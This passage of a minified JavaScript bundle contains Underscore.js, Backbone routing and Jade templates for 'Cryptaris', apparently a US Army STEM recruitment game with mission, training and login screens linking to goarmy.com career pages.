e=arguments.length;if(2>e||null==r)return r;for(var u=1;e>u;u++)for(var i=arguments[u],o=n(i),a=o.length,c=0;a>c;c++){var f=o[c];t&&void 0!==r[f]||(r[f]=i[f])}return r}},j=function(n){if(!m.isObject(n))return{};if(y)return y(n);d.prototype=n;var t=new d;return d.prototype=null,t},w=function(n){return function(t){return null==t?void 0:t[n]}},A=Math.pow(2,53)-1,O=w("length"),k=function(n){var t=O(n);return"number"==typeof t&&t>=0&&A>=t};m.each=m.forEach=function(n,t,r){t=b(t,r);var e,u;if(k(n))for(e=0,u=n.length;u>e;e++)t(n[e],e,n);else{var i=m.keys(n);for(e=0,u=i.length;u>e;e++)t(n[i[e]],i[e],n)}return n},m.map=m.collect=function(n,t,r){t=x(t,r);for(var e=!k(n)&&m.keys(n),u=(e||n).length,i=Array(u),o=0;u>o;o++){var a=e?e[o]:o;i[o]=t(n[a],a,n)}return i},m.reduce=m.foldl=m.inject=n(1),m.reduceRight=m.foldr=n(-1),m.find=m.detect=function(n,t,r){var e;return e=k(n)?m.findIndex(n,t,r):m.findKey(n,t,r),void 0!==e&&-1!==e?n[e]:void 0},m.filter=m.select=function(n,t,r){var e=[];return t=x(t,r),m.each(n,function(n,r,u){t(n,r,u)&&e.push(n)}),e},m.reject=function(n,t,r){return m.filter(n,m.negate(x(t)),r)},m.every=m.all=function(n,t,r){t=x(t,r);for(var e=!k(n)&&m.keys(n),u=(e||n).length,i=0;u>i;i++){var o=e?e[i]:i;if(!t(n[o],o,n))return!1}return!0},m.some=m.any=function(n,t,r){t=x(t,r);for(var e=!k(n)&&m.keys(n),u=(e||n).length,i=0;u>i;i++){var o=e?e[i]:i;if(t(n[o],o,n))return!0}return!1},m.contains=m.includes=m.include=function(n,t,r,e){return k(n)||(n=m.values(n)),("number"!=typeof r||e)&&(r=0),m.indexOf(n,t,r)>=0},m.invoke=function(n,t){var r=l.call(arguments,2),e=m.isFunction(t);return m.map(n,function(n){var u=e?t:n[t];return null==u?u:u.apply(n,r)})},m.pluck=function(n,t){return m.map(n,m.property(t))},m.where=function(n,t){return m.filter(n,m.matcher(t))},m.findWhere=function(n,t){return m.find(n,m.matcher(t))},m.max=function(n,t,r){var e,u,i=-(1/0),o=-(1/0);if(null==t&&null!=n){n=k(n)?n:m.values(n);for(var a=0,c=n.length;c>a;a++)e=n[a],e>i&&(i=e)}else t=x(t,r),m.each(n,function(n,r,e){u=t(n,r,e),(u>o||u===-(1/0)&&i===-(1/0))&&(i=n,o=u)});return i},m.min=function(n,t,r){var e,u,i=1/0,o=1/0;if(null==t&&null!=n){n=k(n)?n:m.values(n);for(var a=0,c=n.length;c>a;a++)e=n[a],i>e&&(i=e)}else t=x(t,r),m.each(n,function(n,r,e){u=t(n,r,e),(o>u||u===1/0&&i===1/0)&&(i=n,o=u)});return i},m.shuffle=function(n){for(var t,r=k(n)?n:m.values(n),e=r.length,u=Array(e),i=0;e>i;i++)t=m.random(0,i),t!==i&&(u[i]=u[t]),u[t]=r[i];return u},m.sample=function(n,t,r){return null==t||r?(k(n)||(n=m.values(n)),n[m.random(n.length-1)]):m.shuffle(n).slice(0,Math.max(0,t))},m.sortBy=function(n,t,r){return t=x(t,r),m.pluck(m.map(n,function(n,r,e){return{value:n,index:r,criteria:t(n,r,e)}}).sort(function(n,t){var r=n.criteria,e=t.criteria;if(r!==e){if(r>e||void 0===r)return 1;if(e>r||void 0===e)return-1}return n.index-t.index}),"value")};var F=function(n){return function(t,r,e){var u={};return r=x(r,e),m.each(t,function(e,i){var o=r(e,i,t);n(u,e,o)}),u}};m.groupBy=F(function(n,t,r){m.has(n,r)?n[r].push(t):n[r]=[t]}),m.indexBy=F(function(n,t,r){n[r]=t}),m.countBy=F(function(n,t,r){m.has(n,r)?n[r]++:n[r]=1}),m.toArray=function(n){return n?m.isArray(n)?l.call(n):k(n)?m.map(n,m.identity):m.values(n):[]},m.size=function(n){return null==n?0:k(n)?n.length:m.keys(n).length},m.partition=function(n,t,r){t=x(t,r);var e=[],u=[];return m.each(n,function(n,r,i){(t(n,r,i)?e:u).push(n)}),[e,u]},m.first=m.head=m.take=function(n,t,r){return null==n?void 0:null==t||r?n[0]:m.initial(n,n.length-t)},m.initial=function(n,t,r){return l.call(n,0,Math.max(0,n.length-(null==t||r?1:t)))},m.last=function(n,t,r){return null==n?void 0:null==t||r?n[n.length-1]:m.rest(n,Math.max(0,n.length-t))},m.rest=m.tail=m.drop=function(n,t,r){return l.call(n,null==t||r?1:t)},m.compact=function(n){return m.filter(n,m.identity)};var S=function(n,t,r,e){for(var u=[],i=0,o=e||0,a=O(n);a>o;o++){var c=n[o];if(k(c)&&(m.isArray(c)||m.isArguments(c))){t||(c=S(c,t,r));var f=0,l=c.length;for(u.length+=l;l>f;)u[i++]=c[f++]}else r||(u[i++]=c)}return u};m.flatten=function(n,t){return S(n,t,!1)},m.without=function(n){return m.difference(n,l.call(arguments,1))},m.uniq=m.unique=function(n,t,r,e){m.isBoolean(t)||(e=r,r=t,t=!1),null!=r&&(r=x(r,e));for(var u=[],i=[],o=0,a=O(n);a>o;o++){var c=n[o],f=r?r(c,o,n):c;t?(o&&i===f||u.push(c),i=f):r?m.contains(i,f)||(i.push(f),u.push(c)):m.contains(u,c)||u.push(c)}return u},m.union=function(){return m.uniq(S(arguments,!0,!0))},m.intersection=function(n){for(var t=[],r=arguments.length,e=0,u=O(n);u>e;e++){var i=n[e];if(!m.contains(t,i)){for(var o=1;r>o&&m.contains(arguments[o],i);o++);o===r&&t.push(i)}}return t},m.difference=function(n){var t=S(arguments,!0,!0,1);return m.filter(n,function(n){return!m.contains(t,n)})},m.zip=function(){return m.unzip(arguments)},m.unzip=function(n){for(var t=n&&m.max(n,O).length||0,r=Array(t),e=0;t>e;e++)r[e]=m.pluck(n,e);return r},m.object=function(n,t){for(var r={},e=0,u=O(n);u>e;e++)t?r[n[e]]=t[e]:r[n[e][0]]=n[e][1];return r},m.findIndex=t(1),m.findLastIndex=t(-1),m.sortedIndex=function(n,t,r,e){r=x(r,e,1);for(var u=r(t),i=0,o=O(n);o>i;){var a=Math.floor((i+o)/2);r(n[a])<u?i=a+1:o=a}return i},m.indexOf=r(1,m.findIndex,m.sortedIndex),m.lastIndexOf=r(-1,m.findLastIndex),m.range=function(n,t,r){null==t&&(t=n||0,n=0),r=r||1;for(var e=Math.max(Math.ceil((t-n)/r),0),u=Array(e),i=0;e>i;i++,n+=r)u[i]=n;return u};var E=function(n,t,r,e,u){if(!(e instanceof t))return n.apply(r,u);var i=j(n.prototype),o=n.apply(i,u);return m.isObject(o)?o:i};m.bind=function(n,t){if(g&&n.bind===g)return g.apply(n,l.call(arguments,1));if(!m.isFunction(n))throw new TypeError("Bind must be called on a function");var r=l.call(arguments,2),e=function(){return E(n,e,t,this,r.concat(l.call(arguments)))};return e},m.partial=function(n){var t=l.call(arguments,1),r=function(){for(var e=0,u=t.length,i=Array(u),o=0;u>o;o++)i[o]=t[o]===m?arguments[e++]:t[o];for(;e<arguments.length;)i.push(arguments[e++]);return E(n,r,this,this,i)};return r},m.bindAll=function(n){var t,r,e=arguments.length;if(1>=e)throw new Error("bindAll must be passed function names");for(t=1;e>t;t++)r=arguments[t],n[r]=m.bind(n[r],n);return n},m.memoize=function(n,t){var r=function(e){var u=r.cache,i=""+(t?t.apply(this,arguments):e);return m.has(u,i)||(u[i]=n.apply(this,arguments)),u[i]};return r.cache={},r},m.delay=function(n,t){var r=l.call(arguments,2);return setTimeout(function(){return n.apply(null,r)},t)},m.defer=m.partial(m.delay,m,1),m.throttle=function(n,t,r){var e,u,i,o=null,a=0;r||(r={});var c=function(){a=r.leading===!1?0:m.now(),o=null,i=n.apply(e,u),o||(e=u=null)};return function(){var f=m.now();a||r.leading!==!1||(a=f);var l=t-(f-a);return e=this,u=arguments,0>=l||l>t?(o&&(clearTimeout(o),o=null),a=f,i=n.apply(e,u),o||(e=u=null)):o||r.trailing===!1||(o=setTimeout(c,l)),i}},m.debounce=function(n,t,r){var e,u,i,o,a,c=function(){var f=m.now()-o;t>f&&f>=0?e=setTimeout(c,t-f):(e=null,r||(a=n.apply(i,u),e||(i=u=null)))};return function(){i=this,u=arguments,o=m.now();var f=r&&!e;return e||(e=setTimeout(c,t)),f&&(a=n.apply(i,u),i=u=null),a}},m.wrap=function(n,t){return m.partial(t,n)},m.negate=function(n){return function(){return!n.apply(this,arguments)}},m.compose=function(){var n=arguments,t=n.length-1;return function(){for(var r=t,e=n[t].apply(this,arguments);r--;)e=n[r].call(this,e);return e}},m.after=function(n,t){return function(){return--n<1?t.apply(this,arguments):void 0}},m.before=function(n,t){var r;return function(){return--n>0&&(r=t.apply(this,arguments)),1>=n&&(t=null),r}},m.once=m.partial(m.before,2);var M=!{toString:null}.propertyIsEnumerable("toString"),I=["valueOf","isPrototypeOf","toString","propertyIsEnumerable","hasOwnProperty","toLocaleString"];m.keys=function(n){if(!m.isObject(n))return[];if(v)return v(n);var t=[];for(var r in n)m.has(n,r)&&t.push(r);return M&&e(n,t),t},m.allKeys=function(n){if(!m.isObject(n))return[];var t=[];for(var r in n)t.push(r);return M&&e(n,t),t},m.values=function(n){for(var t=m.keys(n),r=t.length,e=Array(r),u=0;r>u;u++)e[u]=n[t[u]];return e},m.mapObject=function(n,t,r){t=x(t,r);for(var e,u=m.keys(n),i=u.length,o={},a=0;i>a;a++)e=u[a],o[e]=t(n[e],e,n);return o},m.pairs=function(n){for(var t=m.keys(n),r=t.length,e=Array(r),u=0;r>u;u++)e[u]=[t[u],n[t[u]]];return e},m.invert=function(n){for(var t={},r=m.keys(n),e=0,u=r.length;u>e;e++)t[n[r[e]]]=r[e];return t},m.functions=m.methods=function(n){var t=[];for(var r in n)m.isFunction(n[r])&&t.push(r);return t.sort()},m.extend=_(m.allKeys),m.extendOwn=m.assign=_(m.keys),m.findKey=function(n,t,r){t=x(t,r);for(var e,u=m.keys(n),i=0,o=u.length;o>i;i++)if(e=u[i],t(n[e],e,n))return e},m.pick=function(n,t,r){var e,u,i={},o=n;if(null==o)return i;m.isFunction(t)?(u=m.allKeys(o),e=b(t,r)):(u=S(arguments,!1,!1,1),e=function(n,t,r){return t in r},o=Object(o));for(var a=0,c=u.length;c>a;a++){var f=u[a],l=o[f];e(l,f,o)&&(i[f]=l)}return i},m.omit=function(n,t,r){if(m.isFunction(t))t=m.negate(t);else{var e=m.map(S(arguments,!1,!1,1),String);t=function(n,t){return!m.contains(e,t)}}return m.pick(n,t,r)},m.defaults=_(m.allKeys,!0),m.create=function(n,t){var r=j(n);return t&&m.extendOwn(r,t),r},m.clone=function(n){return m.isObject(n)?m.isArray(n)?n.slice():m.extend({},n):n},m.tap=function(n,t){return t(n),n},m.isMatch=function(n,t){var r=m.keys(t),e=r.length;if(null==n)return!e;for(var u=Object(n),i=0;e>i;i++){var o=r[i];if(t[o]!==u[o]||!(o in u))return!1}return!0};var N=function(n,t,r,e){if(n===t)return 0!==n||1/n===1/t;if(null==n||null==t)return n===t;n instanceof m&&(n=n._wrapped),t instanceof m&&(t=t._wrapped);var u=s.call(n);if(u!==s.call(t))return!1;switch(u){case"[object RegExp]":case"[object String]":return""+n==""+t;case"[object Number]":return+n!==+n?+t!==+t:0===+n?1/+n===1/t:+n===+t;case"[object Date]":case"[object Boolean]":return+n===+t}var i="[object Array]"===u;if(!i){if("object"!=typeof n||"object"!=typeof t)return!1;var o=n.constructor,a=t.constructor;if(o!==a&&!(m.isFunction(o)&&o instanceof o&&m.isFunction(a)&&a instanceof a)&&"constructor"in n&&"constructor"in t)return!1}r=r||[],e=e||[];for(var c=r.length;c--;)if(r[c]===n)return e[c]===t;if(r.push(n),e.push(t),i){if(c=n.length,c!==t.length)return!1;for(;c--;)if(!N(n[c],t[c],r,e))return!1}else{var f,l=m.keys(n);if(c=l.length,m.keys(t).length!==c)return!1;for(;c--;)if(f=l[c],!m.has(t,f)||!N(n[f],t[f],r,e))return!1}return r.pop(),e.pop(),!0};m.isEqual=function(n,t){return N(n,t)},m.isEmpty=function(n){return null==n?!0:k(n)&&(m.isArray(n)||m.isString(n)||m.isArguments(n))?0===n.length:0===m.keys(n).length},m.isElement=function(n){return!(!n||1!==n.nodeType)},m.isArray=h||function(n){return"[object Array]"===s.call(n)},m.isObject=function(n){var t=typeof n;return"function"===t||"object"===t&&!!n},m.each(["Arguments","Function","String","Number","Date","RegExp","Error"],function(n){m["is"+n]=function(t){return s.call(t)==="[object "+n+"]"}}),m.isArguments(arguments)||(m.isArguments=function(n){return m.has(n,"callee")}),"function"!=typeof/./&&"object"!=typeof Int8Array&&(m.isFunction=function(n){return"function"==typeof n||!1}),m.isFinite=function(n){return isFinite(n)&&!isNaN(parseFloat(n))},m.isNaN=function(n){return m.isNumber(n)&&n!==+n},m.isBoolean=function(n){return n===!0||n===!1||"[object Boolean]"===s.call(n)},m.isNull=function(n){return null===n},m.isUndefined=function(n){return void 0===n},m.has=function(n,t){return null!=n&&p.call(n,t)},m.noConflict=function(){return u._=i,this},m.identity=function(n){return n},m.constant=function(n){return function(){return n}},m.noop=function(){},m.property=w,m.propertyOf=function(n){return null==n?function(){}:function(t){return n[t]}},m.matcher=m.matches=function(n){return n=m.extendOwn({},n),function(t){return m.isMatch(t,n)}},m.times=function(n,t,r){var e=Array(Math.max(0,n));t=b(t,r,1);for(var u=0;n>u;u++)e[u]=t(u);return e},m.random=function(n,t){return null==t&&(t=n,n=0),n+Math.floor(Math.random()*(t-n+1))},m.now=Date.now||function(){return(new Date).getTime()};var B={"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#x27;","`":"&#x60;"},T=m.invert(B),R=function(n){var t=function(t){return n[t]},r="(?:"+m.keys(n).join("|")+")",e=RegExp(r),u=RegExp(r,"g");return function(n){return n=null==n?"":""+n,e.test(n)?n.replace(u,t):n}};m.escape=R(B),m.unescape=R(T),m.result=function(n,t,r){var e=null==n?void 0:n[t];return void 0===e&&(e=r),m.isFunction(e)?e.call(n):e};var q=0;m.uniqueId=function(n){var t=++q+"";return n?n+t:t},m.templateSettings={evaluate:/<%([\s\S]+?)%>/g,interpolate:/<%=([\s\S]+?)%>/g,escape:/<%-([\s\S]+?)%>/g};var K=/(.)^/,z={"'":"'","\\":"\\","\r":"r","\n":"n","\u2028":"u2028","\u2029":"u2029"},D=/\\|'|\r|\n|\u2028|\u2029/g,L=function(n){return"\\"+z[n]};m.template=function(n,t,r){!t&&r&&(t=r),t=m.defaults({},t,m.templateSettings);var e=RegExp([(t.escape||K).source,(t.interpolate||K).source,(t.evaluate||K).source].join("|")+"|$","g"),u=0,i="__p+='";n.replace(e,function(t,r,e,o,a){return i+=n.slice(u,a).replace(D,L),u=a+t.length,r?i+="'+\n((__t=("+r+"))==null?'':_.escape(__t))+\n'":e?i+="'+\n((__t=("+e+"))==null?'':__t)+\n'":o&&(i+="';\n"+o+"\n__p+='"),t}),i+="';\n",t.variable||(i="with(obj||{}){\n"+i+"}\n"),i="var __t,__p='',__j=Array.prototype.join,print=function(){__p+=__j.call(arguments,'');};\n"+i+"return __p;\n";try{var o=new Function(t.variable||"obj","_",i)}catch(a){throw a.source=i,a}var c=function(n){return o.call(this,n,m)},f=t.variable||"obj";return c.source="function("+f+"){\n"+i+"}",c},m.chain=function(n){var t=m(n);return t._chain=!0,t};var P=function(n,t){return n._chain?m(t).chain():t};m.mixin=function(n){m.each(m.functions(n),function(t){var r=m[t]=n[t];m.prototype[t]=function(){var n=[this._wrapped];return f.apply(n,arguments),P(this,r.apply(m,n))}})},m.mixin(m),m.each(["pop","push","reverse","shift","sort","splice","unshift"],function(n){var t=o[n];m.prototype[n]=function(){var r=this._wrapped;return t.apply(r,arguments),"shift"!==n&&"splice"!==n||0!==r.length||delete r[0],P(this,r)}}),m.each(["concat","join","slice"],function(n){var t=o[n];m.prototype[n]=function(){return P(this,t.apply(this._wrapped,arguments))}}),m.prototype.value=function(){return this._wrapped},m.prototype.valueOf=m.prototype.toJSON=m.prototype.value,m.prototype.toString=function(){return""+this._wrapped},"function"==typeof define&&define.amd&&define("underscore",[],function(){return m})}).call(this);
},{}],46:[function(require,module,exports){
var storage=require("shared/utils/storage"),ns=require("shared/namespace"),defaults={},appModel=new(Backbone.Model.extend({initialize:function(){this.set("muted",Boolean(storage.getItem("muted")))},events:{PRELOADER:{START:"preloader:start",STOP:"preloader:stop"},SECTION:{CHANGE:"section:change",ROUTE:"section:route"},HARD_ROUTE:"hard-route",FOOTER:{SHOW:"show",HIDE:"hide"},TR_ROTATE:"training-room:rotate",TR_FOCUS:"training-room:focus-tile"}}))(defaults);("dev"===window.env||null!==window.location.search.match("debug"))&&(window._appmodel=appModel),module.exports=appModel;
},{"shared/namespace":140,"shared/utils/storage":223}],47:[function(require,module,exports){
var appModel=require("models/app-model"),client=require("shared/utils/client/client"),Router=Backbone.Router.extend({current:null,routes:{"":"home","!/mission":"mission","!/mission/*id":"mission","!/training-room":"training-room","!/training-room/*id":"training-room","!/profile":"profile","!/home":"home","!/main-menu":"main-menu","!/menu":"home","!/login":"login","!/about":"about","!/mobile-recon":"mobile-recon"},start:function(){this.started=!0,window.addEventListener("hashchange",this.handlePopState.bind(this)),Backbone.history.start({pushState:!1,root:"/"})},initialize:function(){},home:function(){var o={section:"home"};this.goToSection(o)},about:function(){var o={section:"about"};this.goToSection(o)},"main-menu":function(){var o={section:"main-menu"};this.goToSection(o)},login:function(){var o={section:"login"};this.goToSection(o)},profile:function(){var o={section:"profile"};this.goToSection(o)},mission:function(o){var i={section:"mission",chapter:o-1};return void 0!==client.device.type?(window.location.hash="",void window.location.reload()):void this.goToSection(i)},"training-room":function(o){var i={section:"training-room",game:o-1};this.goToSection(i)},"mobile-recon":function(){var o={section:"mobile-recon"};this.goToSection(o)},goToSection:function(o){this.current=window.location.hash,o.type=this.currentRouteType,appModel.trigger(appModel.events.SECTION.ROUTE,o)},handlePopState:function(){var o=window.location.hash;if(o!==this.current){var i=this.current.indexOf("mission")>-1&&3===this.current.split("/").length,n=o.indexOf("mission")>-1&&3===this.current.split("/").length,t=-1!==o.indexOf("mobile-recon"),e=-1!==this.current.indexOf("mobile-recon"),r=-1!==this.current.indexOf("training-room")&&3===this.current.split("/").length,s=-1!==o.indexOf("training-room")&&3===o.split("/").length;i||n||t||e||r||s?this.currentRouteType="hard":this.currentRouteType="soft"}}}),router=new Router;window._router=router,module.exports=router;
},{"models/app-model":46,"shared/utils/client/client":217}],48:[function(require,module,exports){
var jade=require("jade/runtime");module.exports={about:function(s){var i=[];return i.push('<div class="content"><div class="about-block block"><h1 data-label="about stem">about stem</h1><div class="about"><p>Cryptaris is a simulated mission that incorporates many of the US Army\'s STEM capabilities (Science, Technology, Engineering and Math). Today\'s Army offers a wide range of careers for those with STEM aptitude, giving recruits the opportunity to apply analytical thinking and problem-solving in exciting real world settings. The Cryptaris experience challenges a user\'s skill, intelligence and versatility in their efforts to successfully complete the mission.</p></div><a href="http://goarmy.com?iom=AD32-5021-ACNP-MS-GOM-XX-LOG-GM-XX-X-XXX" target="_blank" class="go-army-btn"><div data-label="learn more" class="rect-btn btn"><div class="label">learn more</div>'),function(){var s=[1,2,3,4,5];if("number"==typeof s.length)for(var a=0,e=s.length;e>a;a++){s[a];i.push('<div class="mask"><span>learn more</span></div>')}else{var e=0;for(var a in s){e++;s[a];i.push('<div class="mask"><span>learn more</span></div>')}}}.call(this),i.push('</div><div class="at-goarmy">at goarmy.com</div></a></div><div class="jobs-block block"><h1 data-label="stem jobs">stem jobs</h1><div class="jobs"><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/intelligence-and-combat-support/signals-intelligence-analyst.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-Q41" target="_blank" class="job btn"><div class="label">Signal Intelligence Analyst</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/intelligence-and-combat-support/cryptologic-linguist.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-XXX" target="_blank" class="job btn"><div class="label">Cryptologic Linguist</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/intelligence-and-combat-support/special-forces-medical-sergeant.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-SF3" target="_blank" class="job btn"><div class="label">Special Forces Medical Sergeant</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/intelligence-and-combat-support/special-forces-engineer-sergeant.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-SF5" target="_blank" class="job btn"><div class="label">Special Forces Engineer Sergeant</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/computers-and-technology/cryptologic-network-warfare-specialist.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-DE6" target="_blank" class="job btn"><div class="label">CRYPTOLOGIC NETWORK WARFARE SPECIALIST</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/computers-and-technology/geospatial-intelligence-imagery-analyst.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-DD2" target="_blank" class="job btn"><div class="label">GEOSPATIAL INTELLIGENCE IMAGERY ANALYST</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/computers-and-technology/information-technology-specialist.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-TR5" target="_blank" class="job btn"><div class="label">INFORMATION TECHNOLOGY SPECIALIST</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/transportation-and-aviation/unmanned-aerial-vehicle-operator.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-Q39" target="_blank" class="job btn"><div class="label">UNMANNED AIRCRAFT SYSTEMS OPERATOR</div><div class="open-tab-icon"></div></a></div><a href="http://www.goarmy.com/careers-and-jobs/about-army-stem.html?iom=AD32-5021-ACNP-MS-GOM-XX-LOG-GM-XX-X-XXX" target="_blank" class="go-army-btn btn"><div data-label="more jobs" class="rect-btn btn"><div class="label">more jobs</div>'),function(){var s=[1,2,3,4,5];if("number"==typeof s.length)for(var a=0,e=s.length;e>a;a++){s[a];i.push('<div class="mask"><span>more jobs</span></div>')}else{var e=0;for(var a in s){e++;s[a];i.push('<div class="mask"><span>more jobs</span></div>')}}}.call(this),i.push('</div><div class="at-goarmy">at goarmy.com</div></a></div></div>'),i.join("")},app:function(s){var i=[];return i.push('<div id="webgl" class="fullframe"></div><div id="header-container"></div><div id="main"></div><div id="footer-container"></div><div class="preloader"></div>'),i.join("")},esi:function(s){var i=[];return i.push('<div class="header"></div><div class="log"></div><input class="command"/>'),i.join("")},footer:function(s){var i=[];return i.push(''),i.join("")},header:function(s){var i=[];return i.push(''),i.join("")},home:function(s){var i=[],a=s||{};return function(s){i.push('<div class="content"><div class="buttons">'),s.device.type?"mobile"===s.device.type&&i.push('<div class="item-holder"><div rel="mobile-recon" class="rect-btn btn item">recon</div></div>'):(i.push('<div class="item-holder"><div rel="mission" class="rect-btn btn item"><div class="label">mission</div>'),function(){var s=[1,2,3,4,5];if("number"==typeof s.length)for(var a=0,e=s.length;e>a;a++){s[a];i.push('<div class="mask"><span>mission</span></div>')}else{var e=0;for(var a in s){e++;s[a];i.push('<div class="mask"><span>mission</span></div>')}}}.call(this),i.push("</div></div>")),i.push('<div class="triangle-wand"><div class="double-wand"></div></div><div class="item-holder"><div rel="training-room" class="rect-btn btn item"><div class="label">training</div>'),function(){var s=[1,2,3,4,5];if("number"==typeof s.length)for(var a=0,e=s.length;e>a;a++){s[a];i.push('<div class="mask"><span>training</span></div>')}else{var e=0;for(var a in s){e++;s[a];i.push('<div class="mask"><span>training</span></div>')}}}.call(this),i.push("</div></div></div></div>")}.call(this,"client"in a?a.client:"undefined"!=typeof client?client:void 0),i.join("")},login:function(s){var i=[];return i.push('<div class="header"><div class="title">log_in</div><div class="sub-head">save your score and progress</div></div><div class="buttons"><div data-id="fb" class="btn login-btn popup"><div class="tooltip">facebook</div><div class="icon"><svg version="1.1"\n	 xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:a="http://ns.adobe.com/AdobeSVGViewerExtensions/3.0/"\n	 x="0px" y="0px" width="9px" height="16px" viewBox="0 0 9 16" style="enable-background:new 0 0 9 16;" xml:space="preserve">\n<path d="M3,6V4.1C3,1.9,5.1,0,7.1,0H9v2H7.1C6.1,2,6,3.7,6,5.3V6h3v2H6v8H3V8H0V6H3z"/>\n</svg>\n</div><div class="hex"></div></div><div data-id="google" class="btn login-btn popup"><div class="tooltip">google plus</div><div class="icon"><svg version="1.1"\n	 xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:a="http://ns.adobe.com/AdobeSVGViewerExtensions/3.0/"\n	 x="0px" y="0px" width="24.3px" height="20.8px" viewBox="0 0 24.3 20.8" style="enable-background:new 0 0 24.3 20.8;"\n	 xml:space="preserve">\n	<polygon id="Plus_1_" points="24.3,4.3 20.3,4.3 20.3,0.3 19.3,0.3 19.3,4.3 15.3,4.3 15.3,5.3 19.3,5.3 19.3,9.3 20.3,9.3\n		20.3,5.3 24.3,5.3 "/>\n	<path d="M20.3,10.3h-2v-4h-4v-2h4v-4h2v4h4v2h-4V10.3z M19.3,9.3L19.3,9.3v-4h4.2l0,0h-4.2v-4l0,0v4h-3.8l0,0h3.8V9.3z"/>\n	<path id="g_1_" d="M10.8,12.1c-0.6-0.4-1.7-1.4-1.7-2c0-0.7,0.2-1,1.2-1.8c1-0.8,1.8-2,1.8-3.3c0-1.6-0.7-2.7-2-3.7h2l1.4-1\n		c0,0-4.8,0-6.3,0C4.3,0.3,1.6,2.5,1.6,5c0,2.6,1.9,4.6,4.8,4.6c0.2,0,0.4,0,0.6,0c-0.2,0.4-0.3,0.8-0.3,1.2c0,0.7,0.4,1.3,0.9,1.8\n		c-0.4,0-0.7,0-1.1,0c-3.5,0-6.2,2.2-6.2,4.6c0,2.3,3,3.7,6.5,3.7c4,0,6.2-2.3,6.2-4.6C13,14.4,12.4,13.3,10.8,12.1z M7.4,8.9\n		c-1.6,0-3.2-1.8-3.5-4C3.6,2.8,4.7,1.2,6.4,1.2C8,1.3,9.5,3,9.8,5.2C10.1,7.3,9,9,7.4,8.9z M6.7,19.8c-2.4,0-4.2-1.5-4.2-3.4\n		c0-1.8,2.2-3.3,4.6-3.3c0.6,0,1.1,0.1,1.6,0.3c1.3,0.9,2.3,1.4,2.5,2.5c0,0.2,0.1,0.4,0.1,0.7C11.4,18.4,10.2,19.8,6.7,19.8z"/>\n	<path d="M6.8,20.7c-3.9,0-6.8-1.7-6.8-4c0-2.6,3-4.8,6.5-4.8c0.2,0,0.4,0,0.5,0c-0.4-0.5-0.5-1-0.5-1.5c0-0.3,0.1-0.6,0.2-0.9\n		c-0.1,0-0.1,0-0.2,0c-2.9,0-5.1-2-5.1-4.8C1.4,2.2,4.1,0,7.1,0h7.1l-2.1,1.5H11c0.9,0.7,1.4,1.9,1.4,3.3c0,1.3-0.6,2.4-1.9,3.4\n		C9.4,9,9.4,9.3,9.4,9.8c0,0.4,0.8,1.2,1.6,1.8c1.7,1.2,2.3,2.4,2.3,4.3C13.2,18.3,11,20.7,6.8,20.7z M7.6,12.4c-0.2,0-0.4,0-0.5,0\n		c-0.2,0-0.4,0-0.6,0c-2.8,0-6,1.8-6,4.3c0,2,2.6,3.5,6.2,3.5c3.9,0,6-2.2,6-4.3c0-1.8-0.5-2.8-2.1-3.9c0,0-1.8-1.3-1.8-2.2\n		c0-0.8,0.3-1.2,1.3-2c1.1-0.9,1.7-1.9,1.7-3c0-1.6-0.7-2.9-1.9-3.3L8.7,1H12l0.7-0.5H7.1c-2.8,0-5.3,2-5.3,4.3\n		c0,2.5,1.9,4.3,4.6,4.3c0.1,0,0.2,0,0.3,0C6.9,9,7,9,7,9l0.5,0L7.3,9.4C7.1,9.8,7,10.1,7,10.4c0,0.5,0.2,1,0.8,1.6l0.5,0.4H7.6z\n		 M6.7,19.7c-2.5,0-4.4-1.6-4.4-3.6c0-1.9,2.2-3.6,4.8-3.6l0.1,0c0.6,0,1.1,0.1,1.7,0.3l0.1,0c0.2,0.1,0.3,0.2,0.5,0.3\n		c1.1,0.8,1.9,1.3,2.2,2.3c0.1,0.2,0.1,0.5,0.1,0.7C11.6,17.8,10.8,19.7,6.7,19.7z M7.1,13c-2.3,0-4.3,1.4-4.3,3\n		c0,1.8,1.7,3.1,3.9,3.1c2.9,0,4.4-1,4.4-3c0-0.2,0-0.4-0.1-0.6c-0.2-0.8-0.9-1.3-1.9-2c-0.1-0.1-0.3-0.2-0.5-0.3\n		C8.2,13.1,7.7,13,7.1,13L7.1,13z M7.4,8.9L7.4,8.9C5.6,8.8,4,6.9,3.7,4.7C3.5,3.4,3.8,2.2,4.4,1.5c0.5-0.6,1.1-0.8,1.8-0.8l0.1,0\n		c1.8,0.1,3.4,1.9,3.7,4.1C10.2,6.1,10,7.2,9.3,8C8.8,8.6,8.2,8.9,7.4,8.9z M6.3,1.2c-0.6,0-1.1,0.2-1.5,0.7C4.3,2.5,4,3.5,4.2,4.6\n		c0.3,2,1.7,3.7,3.2,3.8l0.1,0c0.6,0,1.1-0.2,1.4-0.7C9.5,7,9.7,6,9.6,4.8C9.3,2.9,7.9,1.2,6.3,1.2L6.3,1.2z"/>\n</svg>\n</div><div class="hex"></div></div><div data-id="tw" class="btn login-btn popup"><div 